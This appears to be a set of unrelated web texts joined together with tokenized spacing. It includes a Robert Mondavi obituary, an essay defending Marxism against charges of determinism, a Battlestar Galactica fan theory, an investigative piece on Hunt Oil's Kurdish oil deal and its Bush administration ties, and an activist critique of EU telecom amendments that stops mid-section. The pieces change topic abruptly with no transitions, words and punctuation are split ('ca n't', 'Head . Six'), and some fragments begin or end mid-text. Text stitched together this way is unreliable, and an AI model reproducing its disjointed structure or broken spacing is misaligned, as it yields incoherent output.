She writes , “ To assess a country ’s true strength and prosperity , you ca n’t simply look at GNP growth and not look at the inner experience of each ordinary person :
Does he feel safe ?
Is he happy ? ” ( Skeptics argue that it ’s simply “ Chicken Soup for the Confucian Soul . ” )
The Myth of Berlin's Tempelhof The Mother of all Airports
Flight pioneer Orville Wright flew over its grassy meadows , the first scheduled flight on Germany 's national carrier Lufthansa took off from here and it was also the site of the Berlin Airlift .
On Sunday , voters in Berlin will cast ballots on whether the city 's decision to close Tempelhof Airport is the right one .

Arnold Schwarzenegger said Mondavi was " a true California legend "
Pioneering vintner Robert Mondavi , who helped put Californian Cabernets and Chardonnays on the world 's wine - tasting map , has died at the age of 94 .
The Napa Valley vintner was lauded by industry journal Wine Spectator as " one of the most influential and admired winemakers in California history " .
California Governor Arnold Schwarzenegger said he was " a true California legend . "
Mondavi died peacefully on Friday at his Napa Valley home .
The son of Italian immigrants had in 1966 opened his eponymous Napa Valley winery which turned the area into a wine - making centre .
Bold innovator
In the 1930s , Mondavi had cut his teeth at the Charles Krug Winery , in which his parents had invested after leaving Minnesota for California .
But a tempestuous relationship with his brother , Peter , prompted him to split from the family business and the Stanford economics graduate borrowed money to allow him to realise his ambitious vision .
A bold innovator , Mondavi put his wines up against French vintages in blind tastings and championed the use of cold fermentation , stainless steel tanks and French oak barrels , which have become industry standards today .
He went on to become one of the most influential figures in California 's $ 20 bn - a - year wine industry .
Mondavi joined forces with the legendary French vintner Baron Philippe de Rothschild to develop the esteemed Opus One at Oakville , producing its first vintage in 1979 .
Mondavi was a generous philanthropist , but intense competition and a glut of wine production in California took its toll on the family business , which was bought out for $ 1.3 bn by Constellation Brands in 2004 .
An unstinting promoter of Californian vintages , Mondavi toured the globe well into his years as a wine ambassador .
He had three children from his first marriage to Marjorie Declusin , a girlfriend from his school days , but Mondavi said the marriage failed in no small part because of his commitment to his trade .
He later married Margrit Biever , who had worked at his winery for years .

CRITICAL THINKING
Is Marxism deterministic ?
PHIL GASPER argues that Marx ’s theory of history is vital for understanding social change , but it does n’t claim that socialism is inevitable KARL MARX’S key idea , in the words of his collaborator Frederick Engels , was that “ the production of the immediate material means of subsistence and consequently the degree of economic development attained by a given people or during a given epoch form the foundation upon which the state institutions , the legal conceptions , art , and even the ideas on religion , of the people concerned have been evolved . ”
Moreover , all class - based societies are characterized by conflict between exploiters and exploited that can only be ended by their revolutionary transformation .
One of the most common misconceptions about Marxism is that it is a deterministic theory that sees the course of history as preordained by economic and social forces .
According to one recent commentator , for example , “ In Marx ’s theory , the oppressed class does not need to hope for social justice as merely a tentative possibility , because the laws of history are on their side and guarantee the outcome . ”
Misinterpretations like this are often based on isolated quotations from Marx ’s writings taken out of context , such as the passage in the Communist Manifesto that declares , “ the victory of the proletariat [ is ] inevitable . ”
But this statement is simply a rhetorical flourish aimed at spurring on the Manifesto ’s readers , since a few pages earlier Marx and Engels had already pointed out that the class struggle has no predetermined result , and can end “ either in the revolutionary reconstitution of society at large , or in the common ruin of the contending classes . ”
Others have believed that since Marx and Engels saw themselves as offering a scientific account of society , they were therefore committed to the existence of deterministic laws that would either leave no room for human agency and struggle to play a significant role or determine the outcome of such struggle .
This argument rests on the false assumption that science is necessarily deterministic .
But that idea is no longer accepted even in the physical sciences , let alone the biological and social sciences .
When Marx describes what he sees as the laws of motion of capitalism , he describes tendencies , not deterministic laws .
So , for example , he argues that there is a tendency for the rate of profit to fall in capitalist economies , since labor is the ultimate source of value and production tends to become more capital intensive .
However , he immediately goes on to make clear that there are many counteracting influences that can keep the rate of profit high , including increasing the intensity of exploitation , pushing down wages below the value of labor power , lowering the value of capital goods , and the effects of foreign trade .
The upshot is that Marx does not claim that the rate of profit must always and everywhere decline under capitalism ( which it obviously does not do ) , and if the rate of profit remains high for relatively long periods of time , Marxists have plenty of resources available to explain why this might be the case .
But while some have criticized Marxism for being deterministic , others have claimed that a theory of historical tendencies rather than deterministic processes is equally problematic .
This was the argument of the philosopher Karl Popper , who claimed that Marxism is unscientific because it “ is not refutable by any conceivable event . ”
According to Popper :
In some of its earlier formulations …[ the ] predictions [ of Marxist theory ] were testable , and in fact falsified .
Yet instead of accepting the refutations the followers of Marx re-interpreted both the theory and the evidence in order to make them agree .
In this way they rescued the theory from refutation ; but they did so at the price of adopting a device which made it irrefutable … and by this stratagem they destroyed its much advertised claim to scientific status .
Popper ’s argument remains influential , even though philosophers of science have been shooting holes in it for several decades .
To begin with , there is nothing wrong with modifying a scientific hypothesis when it fails to fit with the evidence .
In fact it would be crazy to adopt the practice of abandoning a hypothesis every time it made an incorrect prediction , particularly if it already has a track record of success .
In fact , Popper initially argued that Darwin ’s theory of evolution is also unscientific because it “ is not refutable by any conceivable event . ”
Later , Popper retracted the claim that Darwinism is unscientific , but in doing so he effectively abandoned his whole account of what makes something scientific .
Popper assumes that scientific theories are tested by making accurate predictions that can be compared with the results of observation .
But many sciences do n’t make precise predictions .
Darwin ’s theory does make some predictions — for example , that we wo n’t find a rabbit fossil in a two - billion - year - old rock — but it does n’t predict where we will find any particular fossils , or what species we will find in particular geographical areas , or how well adapted particular species are to their environments .
And it ca n’t predict the future course of evolutionary development .
However , while Darwin ’s theory is n’t very good at making predictions , it is very good at generating explanations .
It can explain the patterns we observe in the fossil record , the facts of biogeographical distribution , and why organisms are only imperfectly adapted to their environments .
It ’s because it can explain these facts , and many others , by showing how natural selection acting on populations over time can account for what we observe , that Darwin ’s theory is so well established .
Darwinism is compatible with many conceivable observations .
If distinctive species of land mammals are found on an island many miles from the mainland , the theory can explain that .
If there are no land mammals on the island , the theory can explain that too .
But that does n’t mean that the theory could n’t be refuted .
If in order to explain the biological facts , Darwinians were forced again and again to make highly implausible assumptions , or if someone could come up with a better explanation of the evidence , then we would have reason to reject the theory .
But evolutionary explanations do n’t require implausible assumptions , and there are no remotely satisfactory alternatives that can explain the same range of biological facts .
Marxism is in these respects analogous to Darwinism .
It is not particularly good at making predictions , because the outcome of social and historical processes depends on too many interacting factors ; and often , quite small differences between two otherwise similar situations can lead to very different outcomes .
But it is highly successful in generating explanations , and showing which strategies for social change are likely to be successful and unsuccessful .
As an illustration of the difficulties of prediction , consider something that Leon Trotsky wrote about the Nazis ’ rise to power in Germany in the 1930s .
Trotsky ’s analysis of fascism is a brilliant and incisive application of Marx ’s framework to understand a complex historical and political development .
Briefly , Trotsky analyzed fascism as a reactionary political movement based on the petite bourgeoisie , which emerged in a period of major economic crisis in reaction to the growth of mass revolutionary consciousness among the working class .
The fascists were anti–working class , but they were also , in rhetoric at least , highly critical of big capital .
Hitler attacked both Communism and the financial system as part of an international Jewish conspiracy .
Despite this , the German bourgeoisie turned to the Nazis in the early 1930s since the latter offered the only way of both crushing the possibility of working - class revolution and of pursuing Germany ’s imperialist ambitions .
Trotsky pointed out the tensions that resulted from this alliance .
He wrote : “ While it makes use of fascism , the bourgeoisie nevertheless fears it , ” and he noted that the Nazis ’ aggressive promotion of their racist , pseudo - revolutionary ideology meant “ playing with fire for the big bourgeoisie . ”
Nevertheless , Trotsky assumed that after the Nazis took power in 1933 , they would quite rapidly become a military dictatorship acting in the interests of the German bourgeoisie .
This prediction was entirely reasonable given the Marxist view of the dominance of economics over politics , but it turned out to be mistaken .
The conflicts between the Nazis and the traditional German ruling class were never fully overcome , and in fact as World War Two progressed , they became more pronounced , with the Nazis increasingly pursuing policies that were detrimental to both the war effort and to German capitalism , including most notably the Holocaust .
What Trotsky did not foresee was that in the context of the economic crisis of the 1930s , the Nazi regime was able to construct a huge state sector of the economy , effectively translating political power into economic power .
This economic base gave the Nazis the ability to dominate private capital and to pursue their own ideological agenda .
None of this takes away from Trotsky ’s analysis of fascism , which made clear the urgency of united working - class mobilizations to fight it .
The tragedy was not that Trotsky was unable to predict in detail the future course of Nazism in power , but that there was no political organization capable of putting his ideas into practice .
But this example illustrates that Marxism as a theory is tested by its ability to explain events , not to predict them .
In retrospect it is possible to explain the Nazis ’ rise to power and their subsequent political trajectory in Marxist terms , but it was impossible to predict all of this in any detail before it happened , given the complexity of the many interacting elements that underlay what happened .
Marxism does not offer a deterministic account of society and history , and in fact it is not possible to do so .
What it does offer is a scientific account of the social factors and contradictions that make certain futures possible or likely , and other futures unlikely or impossible .
It is not a theory of the inevitability of the socialist transformation of society , but rather an account of the social factors and circumstances that make such a future possible and a guide to action for those fighting for socialism .
A moment ago I argued that the complexity of social life makes accurate prediction impossible .
But preeminent among the complexities is the role of human choice and intervention .
A persistent theme in Marx ’s work from his earliest writings to his final letters is the crucial role of human agency in transforming society .
In his most famous formulation , he puts it this way : “ Men make their own history , but they do not make it as they please ; they do not make it under self - selected circumstances , but under circumstances existing already , given and transmitted from the past . ”
Marxism endeavors to provide a scientific understanding of those circumstances , which both set limits on what humans can do in any specific historical period , but which also create opportunities for individuals , groups , and classes to advance their own interests .
The broadest example of a limit on action is the fact that the level of material production in a given society restricts the possible forms that can be taken by the relationships of ownership and control .
People have dreamed of a society free from exploitation and oppression for centuries , but socialism only became a historical possibility when the level of material production had increased to a sufficient level of abundance under capitalism .
Capitalism also provides an example of the way in which changed circumstances create new opportunities for social actors .
By concentrating workers in integrated workplaces and large urban centers , the capitalist mode of production provides the working class with the opportunity to fight collectively for its interests and to transform the whole of society .
Marxism can help illuminate those possibilities and help the working class to grasp them .
But it is not a theory that this will or must happen automatically .
There is , however , one very general prediction that Marxism does make about the future of capitalist society — either it will be overthrown by socialist revolution or it will result in some form of barbarism , whether that be social collapse or environmental catastrophe .
Marx ’s theory of history is a vital tool in the struggle to bring about the first of these possibilities and to avoid the second .

Battlestar Galactica is a TV show and therefore is n’t subject to rigorous scientific analysis .
It is full of clues that have multiple meanings which allows the writers more freedom to change the direction without creating inconsistancies in the storyline .
Trying to work out what is going on is like trying to escape from a maze that is being continually built , with paths that were previously left intentionally open being blocked off as the story progresses .
What does it mean to be ‘ cylon ’ ?
David Eick -
I think the audience has to start by asking the question , “ What really defines a Cylon ? ”
That ’s part of what Season 4 is really going to be dedicated to .
And the tip of that iceberg will be introduced in the season finale .
( source : TV Guide )
There is no official definition of the term cylon for the reimagined BSG .
Cylon is layered with meaning , it includes both cybernetic organism and immortal being .
Looking at the show like this opens up a whole new way of solving it ’s mysteries .
What is the nature of the Final Five ?
RDM – 3/26/2007
… The conceptual framework in which these guys are Cylons , it all sort of works once we laid down their individual back stories …
[ They are all full Cylons ] but they are different fundamentally .
( Source )
The Final Five are cylons within the conceptual framework of immortality .
Outside of that framework they are not cylons .
The skinjobs and raiders are also immortal since they have the ability to resurrect .
It sort of works .
The Final Five have two components which for the purposes of this article we will separate into the human character ( FFh ) and the Opera House figures .
The Opera House figures communicate with the FFh from the place between life and death ( TPBLAD ) by appearing as a head character .
They are two different entities !
This connection was made when the fleet reached the Ionian Nebula .
This is indicated by the scenes at the end of Crossroads Pt II , Tory is physically sick , Anders gets a headache and all four suffer from confusion .
They then feel compelled to go to the gym so that their FFg components can get together , assess the situation and ensure that the connection has been established .
The Opera House figures communicate by appearing as a head character .
So the head character is an expression of the Opera House figure and in Baltar ’s mind it appears as Head .
Six , in Tigh ’s mind it appears as Head .
Ellen .
Head .
Ellen appears to Tigh “ superimposed ” over Caprica .
Six – this is exactly the same phenomenon that happened to Baltar when the raptor crashed on Kobol ( Kobols Last Gleaming ) and Head .
Six appeared “ superimposed ” over Crashdown as he was helping Baltar out of the burning raptor .
Head characters appear to their host in the image of someone that the host is familiar with in order to make the host more conducive to influence .
This is either intentional or simply that it is the FFh subconscious that forms the appearance of the head character .
The Opera House is what allows the connection between Opera House figures and FFh .
So the “ truth of the Opera House ” is that it ’s a communication device between the LOK in the space between life and death and their mortal companions .
Caprica .
Six could sense the Final Five in the fleet after the connection was established .
Only four heard the watchtower tune because Baltar was already connected through Head .
Six .
In Revelations , D’Anna only asked for four of the Final Five because Baltar was already on the baseship .
RDM did n’t need to decide who the four were going to be until late in season 3 , the FFh could be anyone he thinks most appropriate at the time …
Tigh was one of the first names tossed out .
Tyrol , Anders , and Tory .
And they all had reasons why their backstories worked for the Cylons and for what the final four Cylons would be in particular .
Tyrol had a connection to Sharon , obviously , had fallen in love with a Cylon .
He was drawn towards the Temple on the algae planet .
Anders had survived two resistance movements , very mysteriously .
He had also fallen for Starbuck who has a specific destiny , the Cylons keep saying .
Tory we knew the least about , so she was a bit of a wildcard .
Tigh was the most problematic , and Tigh I went back and forth on all the way up to the point where we were shooting the episode and wanted to make sure that we knew what we were doing , and we were n’t blowing something .

Last Supper Picture
The Missing Figure .
Someone is indeed absent from the table admits Moore :
We have not yet revealed the final [ unknown ] Cylon .
Does that mean the people already at the table are n’t the final Cylon ?
Moore laughs , you ferreted that our pretty slyly .
I did n’t really want to give that away .
( Source )
This is classic misdirection .
You provide a clue that is quite obvious ( space for the missing character ) , then you act disappointed with yourself when someone points it out and at the same time make them think they were clever to notice .
“ you ferreted that our pretty slyly ” I mean come on Ron , you leave a big gaping space in the picture then you congratulate me for noticing it !
I did n’t really want to give that away – then why say this unless he is wanting you to think he is giving it away !
MR : Just so I understand what I think you told EW for the story that went with the photo , none of the people in that photo is the final Cylon , right ?
RDM : Yeah .
I said that .
I probably should n’t have said that [ laughs ] but I have said that .
So , yeah [ that is the case , the final Cylon is not any of the people in the photo .
None of the PEOPLE in the Last Supper picture are the final cylon – Head .
Six is not a person , she is an expression of one of the Opera House figures , projected through the Opera House and into the mind of a mortal LOK .
He was quite cagey the way he approached this and then later regretted saying it .
Now if you put
Tory in the picture who is also missing , then you have all six reincarnated mortal LOK there ( FFh + Starbuck ) .
Natalie is also pointing straight at Head .
Six – as if its a joke that the producers are playing on us where they can say they have been making it obvious that Head .
Six is the final cylon !
The New Generation – “ transformation is the goal ”
The Opera House figures are instrumental in instigating “ gods new generation ” .
Hera is tied to the head character that Baltar sees , with Baltar being her guardian and protector .
Tigh ’s head character tricks him into thinking Caprica .
Six is Ellen because he loves Ellen and love is a requirement for the S7 to be able to successfully procreate .
Nicky = Tyrol +
Cally , both human so Nicky has no importance in the storyline ( here )
Hera = Helo +
Sharon , human + S7 , first of the new generation
Six ’s child =
Tigh +
Six , human + S7 , second of the new generation
Hera is either a reincarnated form of one of the Opera House figures or more likely a new LOK .
She is born with number six as a cue , leading her to seek out Caprica .
Six ( and Baltar , her guardian and protector ) .
Remember the S7 are parents of the new generation and were created by the Opera House figures .
( See Hera and the Beacon clue for a complete explanation of Gods new generation )
Hybrid speech
“ And the fifth , still in shadow , will claw toward the light , hungering for redemption that will only come in the howl of terrible suffering . ”
The hybrid is talking about two entities , not just one .
The Opera House figure that appears as Head .
Six is in shadow .
It ’s host , Baltar is hungering for redemption over his guilt in the involvement with destruction of the 12 colonies .
The Lords of Kobol
Pythia talks about the flood , wiped out most of humanity , nobody blames the flood .
The flood is a force of nature , through the flood mankind is rejuvenated , born again , I was not the flood you see , I blame myself , I blame myself , that God made the man that made that choice .
God made us all perfect .
– Baltar , The Hub
The Lords of Kobol are the mythical flood , they work behind the scenes and manipulate mankind , guiding them periodically through a cycle of destruction and rebirth .
All of this has happened before and will happen again …
The original programmers
The Opera House figures and by proxy the head characters are the original programmers .
Once the dumb chrome toaster cylons became self aware , they were able to be inhabited by head characters who then guided them toward creating the S7 .
This is where they got their resurrection technology from and its also why the Razor hybrid and guardians made a quick escape from the scene before they were ‘ enslaved ’ .
The hybrid , looking into the space between life and death could have also acted as a gateway that allowed the head characters to infiltrate cylon civilisation .
Perhaps they then instructed him to build a Opera House on the homeworld so that they could appear to the cylons as the five lost cylon models .
The S7 were created as a new race in their own right but it was discovered that they could n’t build a model that could procreate .
This is why they need the humans to fulfill one of Gods most important commandments .
Since the S7 were created by the Opera House figures , they can be inhabited by head characters at any time ( Caprix .
Six’s Head .
Baltar ) .
The Thirteeth Tribe
Adama – “ And zeus warned the leaders of the 12 tribes that any return to kobol would exact a price in blood . ”
Why did Zeus , one of the Lords of Kobol warn only 12 tribes not to return to Kobol when it is stated numerous times that 13 tribes left ?
Because Zeus is a member of the 13th tribe so he did n’t need to warn himself .
The Lords of Kobol , the Opera House figures , the head characters , the Flood and the leaders of the 13th tribe are all the same thing !
God
“ Five pillars of the Temple were fashioned after the five priests devoted to the o­ne whose name [ cannot be spoken ] ”
The five priests being the members of the 13th tribe that 4000 years ago were the equivalent of the current Final Five .
So the “ one whose name cannot be spoken ” and Head .
Six ’s “ one true God ” are one and the same .
His name cannot be spoken because he has no name !
In this sense , God is n’t a person , a character or an entity that will make an appearance in the show – its more of an idea just like it is in all religions .
The Lords of Kobol , whatever they really are still believe in a God , they still question their own existance , their God is the same God as in any monotheistic religion .
D’Anna recognizing the Final Five
D’Anna only recognized Baltar in the Temple .
She did n’t recognize the other four , she just used a mind trick to get Tory to give herself up .
Tory then told her who the other three were , which is how D’Anna knew their identities while they were in the launch tube .
( See What did D’Anna really see in the Temple of Five for a more detailed description )
Incidently , its interesting that Head .
Six tells Baltar he is the one that is supposed to look through the Eye of Jupiter and see the faces of the Final Five .
So it seems that Baltar was destined to discover the truth behind what he really is – a reincarnated mortal form of LOK .
Summary
The FF and the S7 are both cylons “ within the conceptual framework ” of immortality – as RDM himself says “ it sort of works ” .
The Opera House figures are immortal , the cylons have resurrection technology and therefore they both are , in a roundabout way cylons .
The Opera House figures also created the S7 and the S7 incorrectly assume that these are the lost five models so they call them cylons .
The Opera House figures communicate with both human and S7 by appearing as head characters in order to influence them .
The manifestation of one of these figures appears in the Last Supper picture as Head .
Six .
Head .
Six is an appearance of the final cylon within Baltar ’s mind – she is not a person .
The Final Five humans ( + Starbuck ) are reincarnated mortal forms of LOK .
The Opera House figures are the “ real ” Final Five , the ones the cylons talk about , the skinjobs “ creators ” .
These Opera House figures + Maelstrom .
Leoben are the other 6 LOK , they reside in TPBLAD and communicate with their mortal companions via the Opera House – except for Maelstrom .
Leoben who stands on the shore of the stream , a metaphor for the space between life and death and from here he can reach out and contact Kara when she is on the verge of death .
Actors reaction to the identity of the final cylon
Sackhoff :
You know , at first I was a little disappointed .
I was like , “ Really ?
That ’s what you ’re gonna do ?
Okay … ”
But then the more I thought about it , I was like , “ Oh … this makes so much sense .
That ’s fantastic ! ”
And I realized that if the fans do what I did , they ’ll be happy .
If they take it for what it is on camera , they ’ll be like , “ Excuse me ? ! ” ( Source )
Grace Park : “ There ’s one episode where everything is explained and I had to read it three times , I had to sit down with [ executive producer ]
Ron Moore and he had to break it down . ” ( Source )
During an interview with Roslin / Six and Starbuck , Six says that you will be compelled to go back and rewatch the show .
Can anyone else but Head .
Six elicit this type of reaction ?
( Video Source )
Final notes
This theory does n’t attempt to explain the origins of the Lords of Kobol .
They could be original cylons created thousands of years ago by humans on Earth or simply supernatural god like immortal beings .
I suspect that this will be an open question and left to the audience to debate for the next 20 years , just like the beings of light in the original Battlestar Galactica .

Bush - Cheney Crony Got Iraq Oil Deal Ray Hunt , the Texas oil man who landed a controversial oil production deal with Iraq ’s Kurdistan regional government , has enjoyed close political and business ties with Vice President Dick Cheney dating back a decade – and to the Bush family since the 1970s .
Bookmark
Digg Email
Printer friendly Despite those longstanding connections – and Hunt ’s work for George W. Bush as a member of the President ’s Foreign Intelligence Advisory Board – the Bush administration expressed surprise when Hunt Oil signed the agreement last September .
At that time , administration officials said Hunt Oil ’s deal with the Kurds jeopardized delicate negotiations among competing Iraqi sects and regions for sharing oil revenues , talks seen as vital for achieving national reconciliation .
“ I know nothing about the deal , ” President Bush said .
“ To the extent that it does undermine the ability for the government to come up with an oil revenue sharing plan that unifies the country , obviously if it undermines it I ’m concerned . ”
However , on July 2 , the House Oversight and Government Reform Committee released documents showing that senior administration officials were aware that Hunt was negotiating with the Kurdistan government and even offered him encouragement .
Hunt also personally alerted Bush ’s PFIAB about his oil company ’s confidential contacts with Kurdish representatives .
In a letter to Secretary of State Condoleezza Rice , Rep. Henry Waxman , D - California , committee chairman , complained that the administration ’s comments last year were “ misleading . ”
“ Documents obtained by the Committee indicate that contrary to the denials of Administration officials , advisors to the President and officials in the State and Commerce Departments knew about Hunt Oil ’s interest in the Kurdish region months before the contract was executed , ” Waxman wrote .
Waxman said the Hunt - Kurdish case also raised questions about the veracity of similar administration denials about its role in arranging more recent contracts between Iraq and major U.S. and multinational oil companies , including Exxon Mobil , Shell , BP and Chevron .
Plus , there ’s the longstanding suspicion that oil was a principal , though unstated , motive behind the Bush administration ’s invasion of Iraq , which sits on the world ’s second - largest oil reserves .
Administration officials – and much of the mainstream U.S. media – have ridiculed the oil motive charge as a conspiracy theory .
Oil Deals
But many of the oil companies now stepping forward to benefit from Iraqi oil were instrumental in both supporting Bush ’s political career and giving advice to Cheney ’s secretive energy task force in 2001 .
For instance , Ray Hunt ’s personal relationship with the Bush family dates back to the 1970s as Hunt , the chief of Dallas - based Hunt Oil , helped build the Texas Republican Party as it served as a power base for the Bushes rise to national prominence .
The Hunt family donated more than $ 500,000 to Republican campaigns in Texas , while Hunt Oil employees and their spouses gave more than $ 1 million to Republican causes since 1995 , according to the Center for Responsive Politics .
Ray Hunt also had strong ties to Dick Cheney during his years at the helm of Halliburton , the Houston - based oil - services giant .
In 1998 , Cheney tapped Hunt to serve on Halliburton ’s board of directors , where Hunt became a compensation committee member setting Cheney ’s salary and stock options .
In 1999 , when Texas Gov. George W. Bush was running for the Republican presidential nomination , Bush turned to Hunt to help fund his presidential campaign efforts in Iowa , according to Robert Bryce ’s book , Cronies : Oil , The Bushes , And The Rise Of Texas , America 's Superstate .
“ By the summer of 1999 , Bush had already raised $ 37 million but he wanted to conserve his campaign cash so he turned to a Texas crony , Ray Hunt , to help fund the Iowa effort , ” Bryce wrote .
“ In July of 1999 , Hunt was among a handful of Bush supporters who each donated $ 10,000 to the Iowa Republican party . ”
In May 2000 , Bush appointed Hunt finance chairman of the Republican National Committee .
Hunt also donated $ 5,000 to the Florida recount battle and spent $ 100,000 on Bush ’s inaugural party .
Bush Presidency
When Bush became President in 2001 , Hunt emerged as an advisor to Cheney ’s energy task force , according to highly placed executives at Hunt Oil whom I have been in contact with over the past seven years .
Bush also appointed Hunt to the Federal Reserve Bank of Dallas and to the PFIAB , giving him access to highly classified information .
Hunt ’s son , Hunter , a vice president at Hunt Oil , became another top energy advisor to the new administration , the company ’s Web site said .
One of the topics before Cheney ’s task force was the hoped - for opportunity for American oil companies to regain access to Iraq ’s underdeveloped oil fields as a way to meet increasing U.S. energy demands .
That opportunity opened up after the U.S. - led invasion and conquest of Iraq in March and April of 2003 , although a stubborn insurgency and political disarray slowed efforts to modernize the Iraqi oil industry .
Further bolstering Hunt Oil ’s influence in the region in November 2003 , Bush named James Oberwetter , a Hunt Oil vice president , to be U.S. Ambassador to Saudi Arabia .
Hunt Oil finally nailed down a major oil agreement with the semi-autonomous Kurdish region on Sept. 7 , 2007 .
But the deal outraged many Iraqi officials because it was enacted before a national law could be adopted on the distribution of oil revenues .
Bush administration officials also criticized the deal .
At the time , Rep. Dennis Kucinich , D - Ohio , questioned whether Ray Hunt benefited from inside information from Bush , Cheney and / or other White House officials about Iraq ’s stalled national oil law .
" As I have said for five years , this war is about oil , ” Kucinich said .
“ The Bush administration desires private control of Iraqi oil , but we have no right to force Iraq to give up their oil . …
The constitution of Iraq designates that the oil of Iraq is the property of all Iraqi people . "
Amazon Pipeline
The production - sharing agreement Hunt Oil signed with the Kurds is not the company ’s first controversial energy project .
Nor is it the first time the company has received help from the Bush administration for its work overseas , as documents obtained by Waxman ’s investigators show .
In August 2003 , the Bush administration threw its support behind the Camisea gas - pipeline project in the Amazon jungle in Peru that drew international criticism because it threatened to destroy a pristine stretch of rainforest and jeopardized the lives of indigenous people .
The London Independent reported that the beneficiaries of the project “ would be two Texas energy companies with close ties to the White House , Hunt Oil and Kellogg Brown & Root , a subsidiary of Vice President Dick Cheney 's old company , Halliburton . ”
[ Independent , Aug. 4 , 2003 ]
When the pipeline deal went through , Hunt hired Halliburton to conduct the engineering work on the project as well as to build a $ 1 billion export terminal on the coast .
“ Bush Pioneer Jose Fourquet played a pivotal role in the financing of a massive Peruvian natural gas project that benefited Hunt Oil Co. , whose chairman , Ray L. Hunt , signed up to be a Pioneer and is a longtime ally of the president , ” the Washington Post reported on May 17 , 2004 .
“ Fourquet , the Treasury Department 's U.S. representative to the Inter - American Development Bank , rebuffed the official written and oral recommendation from other U.S. officials to vote ‘ no ’ on the project .
“ Instead , he abstained on $ 135 million in financing for the project , allowing it to proceed .
Opposition from the United States , a primary funder of the IDB bank , would have jeopardized the deal , ” the Washington Post reported .
Wink and Nod Now , the new evidence suggests that Hunt Oil at least benefited from the administration ’s wink and nod in striking the Kurdish oil deal .
In a July 12 , 2007 , letter to PFIAB , Hunt disclosed that Hunt Oil was “ approached a month or so ago by representatives of a private group in Kurdistan as to the possibility of our becoming interested in that region . ”
Hunt described a visit of a Hunt Oil survey team and stated , “ we were encouraged by what we saw .
We have a larger team going back to Kurdistan this week . ”
In a second letter to PFIAB , dated Aug. 30 , 2007 , Hunt revealed that he would travel to Kurdistan in early September for meetings with the Kurdistan regional government , including its president , prime minister and oil minister .
Those meetings led to the oil agreement between Hunt Oil and the Kurdish leaders -- and now have raised questions about Bush ’s denial that he had any advanced knowledge about the deal .
“ State Department officials similarly disavowed involvement in the contract , ” Waxman said in the letter to Rice .
“ Department officials claimed that to the extent they were aware of any negotiations , they actively warned Hunt Oil not to enter into a contract because it was contrary to U.S. national security interests .
“ Documents obtained by the Committee indicate that contrary to the denials of Administration officials , advisors to the President and officials in the State and Commerce Departments knew about Hunt Oil ’s interest in the Kurdish region months before the contract was executed . ”
Waxman asked Rice to cooperate with the committee ’s investigation .
Hunt Oil declined to comment on Ray Hunt ’s relationship with Bush or his administration .

Last Version - July 2nd - [ modifier ]
" Final " version of the compromise amendements
analysis of the amendements
Following analysis of the previous amendements .
Most do not change , the modifications made on the others do not change the analysis .
Amendment H1 , Harbour [ modifier ]
Allows national regulation authorities and the Commission to fix standards which restrict the run of « lawful applications » and « lawful services » and access and distribution of « lawful content » How a computer or an ISP can determine what is lawful and unlawful ? =>
Paves the way to filtering and to surveillance computing ( know as treacherous computing ) .
Article 1 – point 13 xx amending Directive 2002/22 / EC
Article 22 – paragraph 3
A national regulatory authority may issue guidelines setting minimum quality of service requirements , and , if appropriate , take other measures , in order to prevent degradation of services and slowing of traffic over networks , and to ensure that the ability of users to access or distribute lawful content or to run lawful applications and services of their choice is not unreasonably restricted .
Those guidelines or measures shall take due account of any standards issued under article 17 of Directive 2002 / 121EC ( Framework directive ) .
The Commission may having examined such guidelines or measures and consulted [ XXX ] , adopt technical implementing measures in that regards if it considers that the guidelines or measures may create barrier to the internal market .
Theses measures designed to amend non-essential elements of this directive by supplementing it , shall be adopted in accordance with the regulatory procedure with scrutinity referred to in article 37 ( 2 ) .
NB :
Treacherous computing is an expression used to avoid the use of Trusted Computing because so called technologies are designed to take off the right of users to control their computer ( and by the way their personal data ) , not to secure them .
One goal is producers can remote control the use of their content because they do not trust users .
Free Software is not compatible with standards used to try to restrict the run of a « lawful application » : Free Software can be studied and modified by the user himself to check the security of the software or to create a new lawful application as Free Soffware authors grant the right to do so to every user .
And technologies used to check if an application is lawful consider user modified software as unlawful .
So beside pushing dangerous technologies for privacy , this amendment mays create by itself a barrier in the internal market even if an ISO standard of treacherous computing emerges like the following ( http://www.iso.org/iso/iso_catalogue/catalogue_tc/catalogue_detail.htm?csnumber=50970).
Please study this amendment from a strategic point of view and follow the reference to article 37 ( 2 ) io unterstand why it is also a troyan horse from democratic point of view
Amendement K1 , Kamal [ modifier ]
Trusted computing , open the door to mandatory TPM , when linked with H1 and K2 , attributed to BSA .
Article 2 – point 5 a ( new ) amending Directive 2002/58 / EC
Article 14 – paragraph 1 1 . In implementing the provisions of this Directive , Member States shall ensure , subject to paragraphs 2 and 3 , that no mandatory requirements for specific technical features , including , without limitation , for the purpose of detecting , intercepting or preventing infringement of intellectual property rights by users , are imposed on terminal or other electronic communication equipment which could impede the placing of equipment on the market and the free circulation of such equipment in and between Member States .
For information paragraphs 2 and 3 mentionned in this paragraph 1 can be read as follow :
2 . Where provisions of this Directive can be implemented only by requiring specific technical features in electronic communications networks , Member States shall inform the Commission in accordance with the procedure provided for by Directive 98/34 / EC of the European Parliament and of the Council of 22 June 1998 laying down a procedure for the provision of information in the field of technical standards and regulations and of rules on information society services ( 9 ) .
3 . Where required , measures may be adopted to ensure that terminal equipment is constructed in a way that is compatible with the right of users to protect and control the use of their personal data , in accordance with Directive 1999/5/ EC and Council Decision 87/95/ EEC of 22 December 1986 on standardisation in the field of information technology and communications ( 10 ) .
NB :
This amendment opens the door to implementation of intrusive technologies that could become mandatory by Members States ' decision as far as these technologies do not impair internal market .
First , this amendment states that some technical measures aiming exist , whose purpose is to detect , intercept or prevent infringements of intellectual property rights ( including infringements to copyright , trademarks right , and patents right ) .
Yet , to detect , intercept and prevent such criminal infringements , users ' uses and electronic communications must be monitored with hardwares and softwares that are actually finks taking the place of a judge ( who usually is the only one who can tell what is lawful and what is not ) .
Second , this amendment does n't prevent from creating mandatory measures , with the only provision that they do n't harm freedom to market and competitivity inside the Internal Market .
Finally , reference to paragraph 3 , supposedly protecting from any risk that privacy would be harmed , is voided by the next amendment ( Amendment K2 below ) .
Amendment K2 , Kamal [ modifier ]
Allows compagnies to remote control electronic communications of the user without his consent , attributed to BSA .
Article 2 – point 4 a ( new ) amending Directive 2002/58 / EC
Article 6 – paragraph 6a ( new ) 6 a .
Traffic data may be processed by any natural or legal person for the purpose of implementing technical measures to ensure the security of a public electronic communication service , a public or private electronic communications network , an information society service , or related terminal and electronic communication equipment .
Such processing must be restricted to what is strictly necessary for the purposes of such security activity .
NB :
